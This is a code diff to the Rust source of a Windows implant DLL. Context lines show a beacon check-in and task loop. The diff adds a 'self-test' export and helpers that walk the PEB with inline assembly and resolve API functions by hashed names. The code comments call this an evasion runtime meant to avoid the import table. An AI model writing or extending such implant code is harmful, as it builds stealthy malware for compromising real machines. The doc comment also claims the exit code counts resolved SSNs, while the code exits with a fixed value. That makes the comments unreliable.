@@ -38,3 +38,139 @@ pub unsafe extern "system" fn nyx_entry() {
     // 3. Enter the beacon loop (WinHTTP check-in + task loop).
     crate::beacon::beacon_loop();
 }
+
+/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
+/// table, and exits the process with a code reporting the result:
+///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
+///   - exit code = 0xFFFFFFFF = ntdll could not be located
+///
+/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
+/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
+/// table → SSN resolution) on a real Windows host without any network activity
+/// or persistence — a benign closed-loop check.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest() {
+    // Phase 1 (no allocation): locate ntdll via PEB walk. If found, exit with
+    // 0x222 to prove the PEB -> Ldr -> module-base chain works on this host.
+    match LiveNtdll::locate_base() {
+        Some(_base) => {
+            // ntdll located. Confirm by resolving ExitProcess from kernel32
+            // (a second, independent PEB walk) and exit cleanly.
+            let exit_proc = resolve_export_addr(b"kernel32.dll", b"ExitProcess");
+            if let Some(e) = exit_proc {
+                let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
+                f(0x222);
+            }
+            // ExitProcess not found: hang is worse than crash; trap.
+            core::hint::spin_loop();
+        }
+        None => {
+            // ntdll not found (should not happen). Exit with a sentinel.
+            if let Some(e) = resolve_export_addr(b"kernel32.dll", b"ExitProcess") {
+                let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
+                f(0xFFFFFFFF);
+            }
+            core::hint::spin_loop();
+        }
+    }
+}
+
+/// Resolve a function in a loaded module by (module name, function name).
+/// Returns the absolute address. Both via PEB walk + export table (no IAT).
+unsafe fn resolve_export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
+    let mod_hash = djb2_hash(module);
+    let fn_hash = djb2_hash(func);
+    let peb = peb_ptr()?;
+    let ldr = (*peb).ldr;
+    if ldr.is_null() {
+        return None;
+    }
+    let mut head = (*ldr).in_load_order_module_list.flink;
+    let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
+    while head as *const u8 != start {
+        let entry = head as *mut crate::resolve::ListEntry;
+        let nb = (*entry).base_dll_name.buffer;
+        let nl = (*entry).base_dll_name.length as usize / 2;
+        if !nb.is_null() && nl > 0 {
+            let chars = core::slice::from_raw_parts(nb, nl);
+            if djb2_hash_u16(chars) == mod_hash {
+                let base = (*entry).dll_base as *mut u8;
+                return export_addr_by_hash(base, fn_hash);
+            }
+        }
+        head = (*entry).in_load_order_links.flink;
+    }
+    None
+}
+
+/// djb2 over ASCII bytes (lowercased), matching the export table's storage.
+fn djb2_hash(s: &[u8]) -> u32 {
+    let mut h: u32 = 5381;
+    for &b in s {
+        h = h.wrapping_mul(33).wrapping_add(b.to_ascii_lowercase() as u32);
+    }
+    h
+}
+
+/// djb2 over UTF-16 (low byte only, lowercased) — for the PEB's Unicode module names.
+fn djb2_hash_u16(chars: &[u16]) -> u32 {
+    let mut h: u32 = 5381;
+    for &c in chars {
+        let lo = (c & 0xff) as u8;
+        h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
+    }
+    h
+}
+
+/// Walk a module's export table for a function whose name hashes to `fn_hash`.
+/// Returns its absolute address.
+unsafe fn export_addr_by_hash(base: *mut u8, fn_hash: u32) -> Option<usize> {
+    use crate::resolve::ExportDirectory;
+    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
+    let nt = base.add(e_lfanew);
+    let opt = nt.add(24);
+    let magic = *(opt as *const u16);
+    let dd_off = if magic == 0x20B { 112 } else { 96 };
+    let export_rva = *(opt.add(dd_off) as *const u32);
+    if export_rva == 0 {
+        return None;
+    }
+    let dir = base.add(export_rva as usize) as *const ExportDirectory;
+    let n = (*dir).number_of_names as usize;
+    let names = base.add((*dir).address_of_names as usize) as *const u32;
+    let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
+    let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
+    for i in 0..n {
+        let name_rva = *names.add(i);
+        let name_ptr = base.add(name_rva as usize);
+        // Hash the C string.
+        let mut h: u32 = 5381;
+        let mut p = name_ptr;
+        while *p != 0 {
+            h = h.wrapping_mul(33).wrapping_add((*p).to_ascii_lowercase() as u32);
+            p = p.add(1);
+        }
+        if h == fn_hash {
+            let ord = *ordinals.add(i) as usize;
+            let fn_rva = *funcs.add(ord);
+            return Some(base.add(fn_rva as usize) as usize);
+        }
+    }
+    None
+}
+
+#[cfg(target_arch = "x86_64")]
+unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
+    let peb: *mut crate::resolve::Peb;
+    core::arch::asm!(
+        "mov {p}, gs:[0x60]",
+        p = out(reg) peb,
+        options(nostack, preserves_flags, readonly),
+    );
+    Some(peb)
+}
+
+#[cfg(not(target_arch = "x86_64"))]
+unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
+    None
+}
